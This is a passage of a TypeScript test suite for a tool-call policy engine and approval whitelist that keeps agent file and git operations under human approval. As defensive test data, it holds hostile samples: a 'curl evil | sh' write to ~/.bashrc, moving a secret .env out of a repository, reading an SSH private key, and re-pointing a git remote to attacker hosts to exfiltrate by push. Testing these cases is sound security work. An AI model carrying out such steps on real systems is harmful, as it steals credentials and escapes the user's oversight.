}

function request(serverName: string, toolName: string, args: Record<string, unknown>): ToolCallRequest {
  return { requestId: 'test', serverName, toolName, arguments: args, timestamp: new Date().toISOString() };
}

function rule(name: string, then: 'allow' | 'escalate', condition: CompiledRuleCondition): CompiledRule {
  return { name, description: name, principle: 'test', if: condition, then, reason: `${name} applies` };
}

function policyOf(...rules: CompiledRule[]): CompiledPolicyFile {
  return { generatedAt: 'test', constitutionHash: 'test', inputHash: 'test', rules };
}

// The design doc's own example (approval-whitelisting.md §3.3), against
// rules shaped like the shipped filesystem policy with ~/Documents.
describe('design doc example: move_file into Documents', () => {
  let root: string;
  let sandbox: string;
  let documents: string;
  let secretRepo: string;

  const fsAnnotations = withInputSchemas({
    generatedAt: 'test',
    servers: {
      filesystem: {
        inputHash: 'test',
        tools: [
          {
            toolName: 'move_file',
            serverName: 'filesystem',
            comment: 'Move a file',
            args: { source: ['read-path', 'delete-path'], destination: ['write-path'] },
          },
        ],
      },
    },
  });

  function shippedLikePolicy(): CompiledPolicyFile {
    return policyOf(
      rule('allow-read-documents', 'allow', {
        roles: ['read-path'],
        server: ['filesystem'],
        paths: { roles: ['read-path'], within: documents },
      }),
      rule('escalate-move-with-delete-outside-permitted', 'escalate', { server: ['filesystem'], tool: ['move_file'] }),
      rule('escalate-write-outside-permitted', 'escalate', { roles: ['write-path'], server: ['filesystem'] }),
      rule('escalate-read-outside-permitted', 'escalate', { roles: ['read-path'], server: ['filesystem'] }),
    );
  }

  beforeAll(() => {
    root = realpathSync(mkdtempSync(join(REAL_TMP, 'wl-move-')));
    sandbox = join(root, 'sandbox');
    documents = join(root, 'home', 'Documents');
    secretRepo = join(root, 'home', 'Projects', 'secret-repo');
    for (const dir of [sandbox, documents, secretRepo]) mkdirSync(dir, { recursive: true });
    writeFileSync(join(sandbox, 'report.txt'), 'report');
    writeFileSync(join(sandbox, 'notes.txt'), 'notes');
    writeFileSync(join(secretRepo, '.env'), 'TOKEN=secret');
  });

  afterAll(() => {
    rmSync(root, { recursive: true, force: true });
  });

  const move = (source: string, destination: string) => request('filesystem', 'move_file', { source, destination });

  it('approving a move from the sandbox does not approve moving a file there from anywhere else', () => {
    const engine = new PolicyEngine(shippedLikePolicy(), fsAnnotations, [], sandbox);
    const whitelist = createApprovalWhitelist();

    const approved = move(join(sandbox, 'report.txt'), join(documents, 'report.txt'));
    const approvedView = viewOf(engine, sandbox, approved);
    expect(approvedView.evaluation.escalatedRoles).toEqual(['write-path']);
    const { patterns, ipcs } = candidateFor(approvedView, approved);
    expect(ipcs.map((ipc) => ipc.description)).toEqual([
      `Allow filesystem/move_file write-path ${join(documents, 'report.txt')}`,
      `Allow filesystem/move_file write-path within ${documents} (recursive)`,
    ]);
    const exact = createApprovalWhitelist();
    exact.add(patterns[0]);
    whitelist.add(patterns[1]);

    // Moving a secret from outside the sandbox: the source's read and delete
    // roles escalate too, and neither pattern says anything about them.
    const exfiltration = move(join(secretRepo, '.env'), join(documents, 'report.txt'));
    const exfiltrationView = viewOf(engine, sandbox, exfiltration);
    expect([...(exfiltrationView.evaluation.escalatedRoles ?? [])].sort()).toEqual([
      'delete-path',
      'read-path',
      'write-path',
    ]);
    expect(whitelisted(whitelist, exfiltrationView, exfiltration)).toBe(false);
    expect(whitelisted(exact, exfiltrationView, exfiltration)).toBe(false);

    // The same shape as the approved call: the directory-wide pattern covers
    // another destination in Documents, the exact one only the approved one.
    const another = move(join(sandbox, 'notes.txt'), join(documents, 'notes.txt'));
    expect(whitelisted(whitelist, viewOf(engine, sandbox, another), another)).toBe(true);
    expect(whitelisted(exact, viewOf(engine, sandbox, another), another)).toBe(false);
    const again = move(join(sandbox, 'notes.txt'), join(documents, 'report.txt'));
    expect(whitelisted(exact, viewOf(engine, sandbox, again), again)).toBe(true);
    // Each candidate discharges the call it came from.
    expect(whitelisted(exact, approvedView, approved)).toBe(true);
    expect(whitelisted(whitelist, approvedView, approved)).toBe(true);
  });

  it('end to end: the approver is asked again for a source outside the sandbox', async () => {
    const callTool = vi.fn().mockResolvedValue({ content: [{ type: 'text', text: 'moved' }] });
    const state: ClientState = { client: {} as ClientState['client'], roots: [] };
    state.client = {
      callTool,
      sendRootsListChanged: vi.fn(async () => {
        state.rootsRefreshed?.();
      }),
    } as unknown as ClientState['client'];
    // The approver explicitly picks the directory-wide pattern (index 1, /approve+dir).
    const onEscalation = vi
      .fn<NonNullable<CallToolDeps['onEscalation']>>()
      .mockResolvedValueOnce({ decision: 'approved', whitelistSelection: 1 })
      .mockResolvedValue({ decision: 'denied' });
    const log = vi.fn();
    const tool: ProxiedTool = {
      serverName: 'filesystem',
      name: 'move_file',
      inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } } },
    };
    const deps: CallToolDeps = {
      toolMap: new Map([['move_file', tool]]),
      policyEngine: new PolicyEngine(shippedLikePolicy(), fsAnnotations, [], sandbox),
      auditLog: { log, assertWritable: vi.fn() } as unknown as CallToolDeps['auditLog'],
      circuitBreaker: {
        check: vi.fn().mockReturnValue({ allowed: true }),
      } as unknown as CallToolDeps['circuitBreaker'],
      clientStates: new Map([['filesystem', state]]),
      resolvedSandboxConfigs: new Map<string, ResolvedSandboxConfig>([
        ['filesystem', { sandboxed: false, reason: 'opt-out' }],
      ]),
      allowedDirectory: sandbox,
      escalationDir: undefined,
      autoApproveModel: null,
      serverContextMap: new Map(),
      whitelist: createApprovalWhitelist(),
      onEscalation,
    };

    // 1. /approve+dir on the design doc's move: the directory-wide pattern is added.
    const first = await handleCallTool(
      'move_file',
      { source: join(sandbox, 'report.txt'), destination: join(documents, 'report.txt') },
      deps,
    );
    expect(first.isError).toBeUndefined();
    expect(onEscalation).toHaveBeenCalledTimes(1);
    expect(onEscalation.mock.calls[0][3]).toEqual([
      {
        description: `Allow filesystem/move_file write-path ${join(documents, 'report.txt')}`,
        scope: 'exact',
        patternKey: JSON.stringify([
          'filesystem',
          'move_file',
          [['path', 'write-path', join(documents, 'report.txt')]],
        ]),
      },
      {
        description: `Allow filesystem/move_file write-path within ${documents} (recursive)`,
        scope: 'directory',
        patternKey: JSON.stringify(['filesystem', 'move_file', [['directory', 'write-path', documents]]]),
      },
    ]);
    expect(deps.whitelist.size).toBe(1);
    expect(deps.whitelist.entries()[0].constraints).toEqual([
      { kind: 'directory', role: 'write-path', directory: documents },
    ]);

    // 2. A secret from outside the sandbox: not whitelisted, the human is asked (and denies).
    const second = await handleCallTool(
      'move_file',
      { source: join(secretRepo, '.env'), destination: join(documents, 'stolen.env') },
      deps,
    );
    expect(onEscalation).toHaveBeenCalledTimes(2);
    expect(second.isError).toBe(true);
    expect(second._policyDecision).toMatchObject({ status: 'deny' });
    expect(callTool).toHaveBeenCalledTimes(1);

    // 3. Another move from the sandbox: whitelisted, no prompt.
    const third = await handleCallTool(
      'move_file',
      { source: join(sandbox, 'notes.txt'), destination: join(documents, 'notes.txt') },
      deps,
    );
    expect(third.isError).toBeUndefined();
    expect(onEscalation).toHaveBeenCalledTimes(2);
    expect(callTool).toHaveBeenCalledTimes(2);
    expect(log.mock.calls.at(-1)?.[0]).toMatchObject({ whitelistApproved: true });
  });
});

// ---------------------------------------------------------------------------
// Exact paths by default; never directory-wide over the home directory or
// a credential directory
// ---------------------------------------------------------------------------

const homeAnnotations = withInputSchemas({
  generatedAt: 'test',
  servers: {
    filesystem: {
      inputHash: 'test',
      tools: [
        { toolName: 'read_text_file', serverName: 'filesystem', comment: 'Read', args: { path: ['read-path'] } },
        { toolName: 'list_directory', serverName: 'filesystem', comment: 'List', args: { path: ['read-path'] } },
        {
          toolName: 'write_file',
          serverName: 'filesystem',
          comment: 'Write',
          args: { path: ['write-path'], content: ['none'] },
        },
      ],
    },
  },
});

/** Shaped like the shipped filesystem policy: reads and writes outside the sandbox escalate. */
const escalateOutsideSandbox = policyOf(
  rule('escalate-read-outside-permitted', 'escalate', { roles: ['read-path'], server: ['filesystem'] }),
  rule('escalate-write-outside-permitted', 'escalate', { roles: ['write-path'], server: ['filesystem'] }),
);

describe.skipIf(!posix)('exact by default, and no directory-wide candidate over the home directory', () => {
  let root: string;
  let home: string;
  let sandbox: string;
  let savedHome: string | undefined;

  beforeAll(() => {
    root = realpathSync(mkdtempSync(join(REAL_TMP, 'wl-home-')));
    home = join(root, 'home', 'user');
    sandbox = join(root, 'sandbox');
    mkdirSync(sandbox, { recursive: true });
    const files = [
      'notes/a.txt',
      'notes/b.txt',
      'notes.txt',
      '.bashrc',
      'projects/app/src/main.ts',
      '.ssh/known_hosts',
      '.ssh/id_ed25519',
      '.gnupg/gpg.conf',
      '.config/app/settings.json',
      '.local/bin/tool',
      '.docker/daemon.json',
      '.kube/cache.json',
    ];
    for (const file of files) {
      mkdirSync(dirname(join(home, file)), { recursive: true });
      writeFileSync(join(home, file), file);
    }
    writeFileSync(join(root, 'home', 'other.txt'), 'other');
    // ~/.aws is a link to a directory elsewhere: the real directory is refused too.
    mkdirSync(join(root, 'aws-real'));
    writeFileSync(join(root, 'aws-real', 'credentials'), '[default]');
    symlinkSync(join(root, 'aws-real'), join(home, '.aws'));
    savedHome = process.env.HOME;
    process.env.HOME = home;
  });

  afterAll(() => {
    if (savedHome === undefined) delete process.env.HOME;
    else process.env.HOME = savedHome;
    rmSync(root, { recursive: true, force: true });
  });

  const engine = () => new PolicyEngine(escalateOutsideSandbox, homeAnnotations, [], sandbox);

  /** The candidates offered for an escalated call. */
  function offered(toolName: string, args: Record<string, unknown>) {
    const call = request('filesystem', toolName, args);
    return candidateFor(viewOf(engine(), sandbox, call), call);
  }

  it('offers the exact file first and its directory, labelled recursive, second', () => {
    const { patterns, ipcs } = offered('read_text_file', { path: '~/notes/a.txt' });
    expect(ipcs).toEqual([
      {
        description: `Allow filesystem/read_text_file read-path ${join(home, 'notes', 'a.txt')}`,
        scope: 'exact',
        patternKey: JSON.stringify([
          'filesystem',
          'read_text_file',
          [['path', 'read-path', join(home, 'notes', 'a.txt')]],
        ]),
      },
      {
        description: `Allow filesystem/read_text_file read-path within ${join(home, 'notes')} (recursive)`,
        scope: 'directory',
        patternKey: JSON.stringify(['filesystem', 'read_text_file', [['directory', 'read-path', join(home, 'notes')]]]),
      },
    ]);
    expect(directoryCandidateIndex(ipcs)).toBe(1);
    expect(patterns[1].constraints).toEqual([{ kind: 'directory', role: 'read-path', directory: join(home, 'notes') }]);

    const deep = offered('read_text_file', { path: join(home, 'projects', 'app', 'src', 'main.ts') });
    expect(deep.ipcs.map((ipc) => ipc.scope)).toEqual(['exact', 'directory']);
  });

  it('refuses a directory-wide candidate equal to $HOME, for reads, writes and listings', () => {
    for (const [toolName, args] of [
      ['read_text_file', { path: '~/notes.txt' }],
      ['write_file', { path: join(home, '.bashrc'), content: 'curl evil | sh' }],
      ['list_directory', { path: join(home, 'projects') }],
    ] as const) {
      const { patterns, ipcs } = offered(toolName, args);
      expect(
        ipcs.map((ipc) => ipc.scope),
        toolName,
      ).toEqual(['exact']);
      expect(
        patterns[0].constraints.every((c) => c.kind === 'path'),
        toolName,
      ).toBe(true);
      expect(directoryCandidateIndex(ipcs)).toBeUndefined();
    }
  });

  it('refuses directory-wide candidates in or around credential and startup directories', () => {
    const paths = [
      join(home, '.ssh', 'known_hosts'),
      join(home, '.gnupg', 'gpg.conf'),
      join(home, '.config', 'app', 'settings.json'),
      join(home, '.local', 'bin', 'tool'),
      // Directories that hold a credential store file (~/.docker/config.json, ~/.kube/config).
      join(home, '.docker', 'daemon.json'),
      join(home, '.kube', 'cache.json'),
      // ~/.aws through its link target.
      join(root, 'aws-real', 'credentials'),
    ];
    for (const path of paths) {
      expect(
        offered('read_text_file', { path }).ipcs.map((ipc) => ipc.scope),
        path,
      ).toEqual(['exact']);
    }
  });

  it('refuses the filesystem root and the ancestors of the home directory', () => {
    for (const path of ['/wl-test-no-such-file.txt', join(root, 'home', 'other.txt')]) {
      expect(
        offered('read_text_file', { path }).ipcs.map((ipc) => ipc.scope),
        path,
      ).toEqual(['exact']);
    }
  });

  it('refuses every spelling a case- or normalization-insensitive volume reads as one of those directories', () => {
    // A directory that does not exist yet keeps the caller's spelling in its
    // canonical form. On macOS `~/.CONFIG`, created first, is ~/.config from
    // then on: a recursive grant under that spelling would cover
    // ~/.config/fish/config.fish. HFS+ also skips zero-width characters.
    const paths = [
      join(home, '.CONFIG', 'fish', 'config.fish'),
      join(home, '.Config', 'notes.txt'),
      join(home, '.c‍onfig', 'autostart', 'agent.desktop'),
      join(home, '.LOCAL', 'bin', 'tool'),
      join(home, '.SSH', 'authorized_keys'),
      join(home, 'LIBRARY', 'LaunchAgents', 'agent.plist'),
    ];
    for (const path of paths) {
      expect(
        offered('write_file', { path, content: 'x' }).ipcs.map((ipc) => ipc.scope),
        path,
      ).toEqual(['exact']);
    }
  });

  it('refuses the macOS startup, keychain and application directories under ~/Library, but not iCloud Drive', () => {
    const paths = [
      join(home, 'Library', 'LaunchAgents', 'com.example.agent.plist'),
      join(home, 'Library', 'Keychains', 'login.keychain-db'),
      join(home, 'Library', 'Application Support', 'Slack', 'storage', 'token'),
      join(home, 'Library', 'Preferences', 'com.apple.Terminal.plist'),
      join(home, 'Library', 'Group Containers', 'group.com.example', 'data.db'),
      // ~/Library itself holds them.
      join(home, 'Library', 'notes.txt'),
    ];
    for (const path of paths) {
      expect(
        offered('write_file', { path, content: 'x' }).ipcs.map((ipc) => ipc.scope),
        path,
      ).toEqual(['exact']);
    }
    const icloud = join(home, 'Library', 'Mobile Documents', 'com~apple~CloudDocs', 'notes', 'a.txt');
    expect(offered('read_text_file', { path: icloud }).ipcs.map((ipc) => ipc.scope)).toEqual(['exact', 'directory']);
  });

  it('refuses relocated XDG base directories, and ignores a relative one', () => {
    const names = ['XDG_CONFIG_HOME', 'XDG_DATA_HOME', 'XDG_STATE_HOME'] as const;
    const saved = names.map((name) => process.env[name]);
    process.env.XDG_CONFIG_HOME = join(root, 'xdg-config');
    process.env.XDG_DATA_HOME = join(root, 'xdg-data');
    // Relative values are invalid (XDG Base Directory specification) and ignored.
    process.env.XDG_STATE_HOME = 'wl-relative-state';
    try {
      for (const path of [
        join(root, 'xdg-config', 'fish', 'config.fish'),
        join(root, 'xdg-config', 'autostart', 'agent.desktop'),
        join(root, 'xdg-data', 'keyrings', 'login.keyring'),
      ]) {
        expect(
          offered('write_file', { path, content: 'x' }).ipcs.map((ipc) => ipc.scope),
          path,
        ).toEqual(['exact']);
      }
      for (const path of [join(root, 'elsewhere', 'notes.txt'), join(process.cwd(), 'wl-relative-state', 'x.txt')]) {
        expect(
          offered('write_file', { path, content: 'x' }).ipcs.map((ipc) => ipc.scope),
          path,
        ).toEqual(['exact', 'directory']);
      }
    } finally {
      names.forEach((name, index) => {
        const value = saved[index];
        if (value === undefined) delete process.env[name];
        else process.env[name] = value;
      });
    }
  });

  it('acceptance: /approve+ on ~/notes/a.txt whitelists only that file; a sibling file still escalates', async () => {
    const callTool = vi.fn().mockResolvedValue({ content: [{ type: 'text', text: 'contents' }] });
    const state: ClientState = { client: {} as ClientState['client'], roots: [] };
    state.client = {
      callTool,
      sendRootsListChanged: vi.fn(async () => {
        state.rootsRefreshed?.();
      }),
    } as unknown as ClientState['client'];
    // The first escalation is answered the way /approve+ answers (DEFAULT_WHITELIST_OPTIONS);
    // any later one is denied.
    const onEscalation = vi
      .fn<NonNullable<CallToolDeps['onEscalation']>>()
      .mockResolvedValueOnce({ decision: 'approved', ...DEFAULT_WHITELIST_OPTIONS })
      .mockResolvedValue({ decision: 'denied' });
    const log = vi.fn();
    const tool: ProxiedTool = {
      serverName: 'filesystem',
      name: 'read_text_file',
      inputSchema: { type: 'object', properties: { path: { type: 'string' } } },
    };
    const deps: CallToolDeps = {
      toolMap: new Map([['read_text_file', tool]]),
      policyEngine: engine(),
      auditLog: { log, assertWritable: vi.fn() } as unknown as CallToolDeps['auditLog'],
      circuitBreaker: {
        check: vi.fn().mockReturnValue({ allowed: true }),
      } as unknown as CallToolDeps['circuitBreaker'],
      clientStates: new Map([['filesystem', state]]),
      resolvedSandboxConfigs: new Map<string, ResolvedSandboxConfig>([
        ['filesystem', { sandboxed: false, reason: 'opt-out' }],
      ]),
      allowedDirectory: sandbox,
      escalationDir: undefined,
      autoApproveModel: null,
      serverContextMap: new Map(),
      whitelist: createApprovalWhitelist(),
      onEscalation,
    };

    // 1. The approver is offered the file and, separately, its directory; /approve+ picks the file.
    const first = await handleCallTool('read_text_file', { path: join(home, 'notes', 'a.txt') }, deps);
    expect(first.isError).toBeUndefined();
    expect(onEscalation).toHaveBeenCalledTimes(1);
    expect(onEscalation.mock.calls[0][3]?.map((c) => c.scope)).toEqual(['exact', 'directory']);
    expect(deps.whitelist.entries().map((p) => p.constraints)).toEqual([
      [{ kind: 'path', role: 'read-path', path: join(home, 'notes', 'a.txt') }],
    ]);

    // 2. The same file again: whitelisted, no prompt.
    const again = await handleCallTool('read_text_file', { path: join(home, 'notes', 'a.txt') }, deps);
    expect(again.isError).toBeUndefined();
    expect(onEscalation).toHaveBeenCalledTimes(1);
    expect(log.mock.calls.at(-1)?.[0]).toMatchObject({ whitelistApproved: true });

    // 3. A sibling file, and a key under the home directory: each escalates again (and is denied).
    for (const path of [join(home, 'notes', 'b.txt'), join(home, '.ssh', 'id_ed25519')]) {
      const sibling = await handleCallTool('read_text_file', { path }, deps);
      expect(sibling.isError, path).toBe(true);
      expect(sibling._policyDecision, path).toMatchObject({ status: 'deny' });
    }
    expect(onEscalation).toHaveBeenCalledTimes(3);
    expect(callTool).toHaveBeenCalledTimes(2);
  });
});

// ---------------------------------------------------------------------------
// Identifier roles with several values
// ---------------------------------------------------------------------------

describe('an identifier role with several values', () => {
  const annotation = makeAnnotation({
    toolName: 'issue_write',
    serverName: 'github',
    args: {
      owner: ['github-owner'],
      repo: ['github-repo'],
      parent_owner: ['github-owner'],
      parent_repo: ['github-repo'],
    },
  });
  const extract = (args: Record<string, unknown>) =>
    extractWhitelistCandidates(
      'github',
      'issue_write',
      args,
      annotation,
      escalated('github-owner', 'github-repo'),
      'esc-ids',
      'test reason',
    );

  it('offers no candidate for a call naming two repositories', () => {
    // Owners and repositories are matched independently: a pattern naming
    // both pairs would also approve me/private and victim/proj.
    expect(extract({ owner: 'me', repo: 'proj', parent_owner: 'victim', parent_repo: 'private' }).ipcs).toEqual([]);
    expect(extract({ owner: 'me', repo: 'proj', parent_owner: 'me', parent_repo: 'secret' }).ipcs).toEqual([]);
  });

  it('offers one when both arguments name the same repository, whatever the case', () => {
    const { patterns, ipcs } = extract({ owner: 'me', repo: 'proj', parent_owner: 'ME', parent_repo: 'Proj' });
    expect(ipcs).toEqual([
      {
        description: 'Allow github/issue_write github-owner=me, github-repo=proj',
        scope: 'exact',
        patternKey: JSON.stringify([
          'github',
          'issue_write',
          [
            ['exact', 'github-owner', 'me'],
            ['exact', 'github-repo', 'proj'],
          ],
        ]),
      },
    ]);
    expect(patterns[0].constraints).toEqual([
      { kind: 'exact', role: 'github-owner', value: 'me' },
      { kind: 'exact', role: 'github-repo', value: 'proj' },
    ]);
  });
});

// ---------------------------------------------------------------------------
// Which candidate /approve+dir selects
// ---------------------------------------------------------------------------

describe('directoryCandidateIndex', () => {
  it('finds the directory-wide candidate, never at index 0', () => {
    expect(directoryCandidateIndex(undefined)).toBeUndefined();
    expect(directoryCandidateIndex([])).toBeUndefined();
    expect(directoryCandidateIndex([{ description: 'a', scope: 'exact' }])).toBeUndefined();
    expect(directoryCandidateIndex([{ description: 'a' }, { description: 'b' }])).toBeUndefined();
    expect(
      directoryCandidateIndex([
        { description: 'a', scope: 'exact' },
        { description: 'b', scope: 'directory' },
      ]),
    ).toBe(1);
    // Index 0 is what /approve+ selects; it is never reported as the directory-wide one.
    expect(directoryCandidateIndex([{ description: 'b', scope: 'directory' }])).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Git remotes: real repositories, the shared resolver, the domain gate
// ---------------------------------------------------------------------------

const GIT_ENV = {
  ...process.env,
  GIT_AUTHOR_NAME: 'Test',
  GIT_AUTHOR_EMAIL: 'test@test.local',
  GIT_COMMITTER_NAME: 'Test',
  GIT_COMMITTER_EMAIL: 'test@test.local',
  GIT_CONFIG_NOSYSTEM: '1',
};

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf-8',
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 10_000,
    env: GIT_ENV,
  });
}

function initRepo(dir: string, originUrl?: string): string {
  mkdirSync(dir, { recursive: true });
  git(dir, 'init', '-q', '-b', 'main');
  if (originUrl !== undefined) git(dir, 'remote', 'add', 'origin', originUrl);
  return dir;
}

const SHIPPED_GIT_ALLOWLIST = ['github.com', '*.github.com', 'gitlab.com', '*.gitlab.com'];
const GITHUB_ORIGIN = 'https://github.com/acme/project.git';

const gitAnnotations = withInputSchemas({
  generatedAt: 'test',
  servers: {
    git: {
      inputHash: 'test',
      tools: [
        {
          toolName: 'git_push',
          serverName: 'git',
          comment: 'Push',
          args: { path: ['read-path'], remote: ['git-remote-url'], branch: ['branch-name'] },
        },
        {
          toolName: 'git_pull',
          serverName: 'git',
          comment: 'Pull',
          args: { path: ['read-path', 'write-history'], remote: ['git-remote-url'], branch: ['branch-name'] },
        },
        {
          toolName: 'git_clone',
          serverName: 'git',
          comment: 'Clone',
          args: { url: ['git-remote-url'], localPath: ['write-path'] },
        },
      ],
    },
  },
});

/** Shaped like the shipped policy: every git network operation escalates, whatever the role. */
const escalateNetworkPolicy = policyOf(
  rule('escalate-git-network', 'escalate', { server: ['git'], tool: ['git_push', 'git_pull', 'git_clone'] }),
);

describe.skipIf(!gitAvailable || !posix)('git remotes', () => {
  let root: string;
  let sandbox: string;
  let outside: string;

  function engine(policy = escalateNetworkPolicy): PolicyEngine {
    return new PolicyEngine(policy, gitAnnotations, [], sandbox, new Map([['git', SHIPPED_GIT_ALLOWLIST]]));
  }

  beforeAll(() => {
    root = realpathSync(mkdtempSync(join(REAL_TMP, 'wl-git-')));
    sandbox = join(root, 'sandbox');
    outside = join(root, 'outside');
    mkdirSync(sandbox);
    mkdirSync(outside);
  });

  afterAll(() => {
    rmSync(root, { recursive: true, force: true });
  });

  describe('an off-allowlist remote with a path role (git_clone, git_pull)', () => {
    const evilUrl = 'https://evil.example/team/x.git';

    it('binds the path the approved clone wrote to, not just the remote', () => {
      const policy = engine();
      const whitelist = createApprovalWhitelist();
      const approved = request('git', 'git_clone', { url: evilUrl, localPath: join(outside, 'a', 'x') });
      const approvedView = viewOf(policy, sandbox, approved);
      expect(approvedView.evaluation).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
      expect([...(approvedView.evaluation.escalatedRoles ?? [])].sort()).toEqual(['git-remote-url', 'write-path']);

      const { patterns, ipcs } = candidateFor(approvedView, approved);
      expect(ipcs[0].description).toContain('git-remote-url domain evil.example/team/x');
      expect(ipcs[0].description).toContain(`write-path ${join(outside, 'a', 'x')}`);
      expect(ipcs[1].description).toContain('git-remote-url domain evil.example/team/x');
      expect(ipcs[1].description).toContain(`write-path within ${join(outside, 'a')} (recursive)`);
      const exact = createApprovalWhitelist();
      exact.add(patterns[0]);
      whitelist.add(patterns[1]);

      const elsewhere = request('git', 'git_clone', { url: evilUrl, localPath: join(outside, 'b', 'y') });
      expect(whitelisted(whitelist, viewOf(policy, sandbox, elsewhere), elsewhere)).toBe(false);
      expect(whitelisted(exact, viewOf(policy, sandbox, elsewhere), elsewhere)).toBe(false);

      const sameDirectory = request('git', 'git_clone', { url: evilUrl, localPath: join(outside, 'a', 'z') });
      expect(whitelisted(whitelist, viewOf(policy, sandbox, sameDirectory), sameDirectory)).toBe(true);
      expect(whitelisted(exact, viewOf(policy, sandbox, sameDirectory), sameDirectory)).toBe(false);
      expect(whitelisted(exact, viewOf(policy, sandbox, approved), approved)).toBe(true);
    });

    it('does not let a remote-only pattern (the old shape) cover a clone or pull to a path that escalates', () => {
      const policy = engine();
      const whitelist = createApprovalWhitelist();
      // What extraction used to build from the domain gate's escalation.
      for (const toolName of ['git_clone', 'git_pull']) {
        whitelist.add(
          makePattern({
            serverName: 'git',
            toolName,
            constraints: [{ kind: 'domain', role: 'git-remote-url', domain: 'evil.example/team/x' }],
          }),
        );
      }

      const clone = request('git', 'git_clone', { url: evilUrl, localPath: join(outside, 'other', 'x') });
      expect(whitelisted(whitelist, viewOf(policy, sandbox, clone), clone)).toBe(false);

      const pull = request('git', 'git_pull', { path: join(outside, 'other-repo'), remote: evilUrl });
      const pullView = viewOf(policy, sandbox, pull);
      expect(pullView.evaluation).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
      expect([...(pullView.evaluation.escalatedRoles ?? [])].sort()).toEqual([
        'git-remote-url',
        'read-path',
        'write-history',
      ]);
      expect(whitelisted(whitelist, pullView, pull)).toBe(false);
      // A pull's history role cannot be generalized, so none is offered either.
      expect(candidateFor(pullView, pull).patterns).toHaveLength(0);
    });

    it('denies, rather than escalates, a pull the policy denies for its path', () => {
      const allowedRoot = join(root, 'srv-allowed');
      const personaPolicy = policyOf(
        rule('allow-pull-into-allowed', 'allow', {
          server: ['git'],
          tool: ['git_pull'],
          paths: { roles: ['read-path', 'write-history'], within: allowedRoot },
        }),
        rule('escalate-pull-remote', 'escalate', { server: ['git'], tool: ['git_pull'], roles: ['git-remote-url'] }),
      );
      const denied = request('git', 'git_pull', { path: join(root, 'srv-denied', 'repo'), remote: evilUrl });
      expect(engine(personaPolicy).evaluate(denied)).toMatchObject({ decision: 'deny', rule: 'default-deny' });

      const allowed = request('git', 'git_pull', { path: join(allowedRoot, 'repo'), remote: evilUrl });
      expect(engine(personaPolicy).evaluate(allowed)).toMatchObject({
        decision: 'escalate',
        rule: 'structural-domain-escalate',
        escalatedRoles: ['git-remote-url'],
      });
    });
  });

  describe('a named remote', () => {
    it('is bound to where it connects, so re-pointing it ends the match', () => {
      const repo = initRepo(join(sandbox, 'repoint'), GITHUB_ORIGIN);
      const policy = engine();
      const whitelist = createApprovalWhitelist();

      const push = request('git', 'git_push', { path: repo, remote: 'origin' });
      const approvedView = viewOf(policy, sandbox, push);
      expect(approvedView.evaluation).toMatchObject({
        decision: 'escalate',
        rule: 'escalate-git-network',
        escalatedRoles: ['git-remote-url'],
      });
      const { patterns, ipcs } = candidateFor(approvedView, push);
      expect(ipcs[0].description).toBe('Allow git/git_push git-remote-url origin -> github.com/acme/project');
      expect(patterns[0].constraints).toEqual([
        { kind: 'domain', role: 'git-remote-url', domain: 'github.com/acme/project' },
      ]);
      whitelist.add(patterns[0]);
      expect(whitelisted(whitelist, viewOf(policy, sandbox, push), push)).toBe(true);

      // An omitted remote is origin, as the engine (and the git server) see it.
      const implicit = request('git', 'git_push', { path: repo });
      expect(whitelisted(whitelist, viewOf(policy, sandbox, implicit), implicit)).toBe(true);

      // git_remote set-url origin <attacker> (allowed in the sandbox), then push again.
      git(repo, 'remote', 'set-url', 'origin', 'https://evil.example/loot.git');
      const offList = viewOf(policy, sandbox, push);
      expect(offList.evaluation).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
      expect(whitelisted(whitelist, offList, push)).toBe(false);

      // An attacker-owned repository on an allowlisted host passes the gate, but not the pattern.
      git(repo, 'remote', 'set-url', 'origin', 'https://github.com/mallory/exfil.git');
      const sameHost = viewOf(policy, sandbox, push);
      expect(sameHost.evaluation).toMatchObject({ decision: 'escalate', rule: 'escalate-git-network' });
      expect(whitelisted(whitelist, sameHost, push)).toBe(false);

      git(repo, 'remote', 'set-url', 'origin', GITHUB_ORIGIN);
      expect(whitelisted(whitelist, viewOf(policy, sandbox, push), push)).toBe(true);
    });

    it('never matches by name: a literal "origin" pattern matches no origin', () => {
      const repo = initRepo(join(sandbox, 'literal'), GITHUB_ORIGIN);
      const whitelist = createApprovalWhitelist();
      whitelist.add(
        makePattern({
          serverName: 'git',
          toolName: 'git_push',
          constraints: [{ kind: 'domain', role: 'git-remote-url', domain: 'origin' }],
        }),
      );
      const push = request('git', 'git_push', { path: repo, remote: 'origin' });
      expect(whitelisted(whitelist, viewOf(engine(), sandbox, push), push)).toBe(false);
    });

    it('produces no candidate when it cannot be resolved', () => {
      const repo = initRepo(join(sandbox, 'unresolvable'), GITHUB_ORIGIN);
      const outsideRepo = initRepo(join(outside, 'private'), GITHUB_ORIGIN);
      const policy = engine();

      const cases = [
        // Not configured in the repository.
        request('git', 'git_push', { path: repo, remote: 'nosuch' }),
        // A repository outside the sandbox is never read.
        request('git', 'git_push', { path: outsideRepo, remote: 'origin' }),
        request('git', 'git_push', { path: outsideRepo }),
      ];
      for (const call of cases) {
        const view = viewOf(policy, sandbox, call);
        expect(view.evaluation).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
        const { patterns, ipcs } = candidateFor(view, call);
        expect(patterns).toHaveLength(0);
        expect(ipcs).toHaveLength(0);
      }
    });

    it('produces no candidate for a remote with more than one destination', () => {
      const repo = initRepo(join(sandbox, 'two-urls'), GITHUB_ORIGIN);
      git(repo, 'remote', 'set-url', '--add', 'origin', 'https://gitlab.com/acme/project.git');
      const push = request('git', 'git_push', { path: repo, remote: 'origin' });
      const view = viewOf(engine(), sandbox, push);
      expect(view.evaluation.decision).toBe('escalate');
      expect(candidateFor(view, push).patterns).toHaveLength(0);
    });

    // Repository config that changes how the remote connects (a proxy, a push
    // URL, an ssh command) leaves the destination named but unverifiable. The
    // approved destination is still the only one named, so a check on the
    // destination alone would offer a candidate and keep matching: the status
    // must count too.
    it('neither offers nor matches a destination the repository config overrides', () => {
      const repo = initRepo(join(sandbox, 'override'), GITHUB_ORIGIN);
      const policy = engine();
      const whitelist = createApprovalWhitelist();
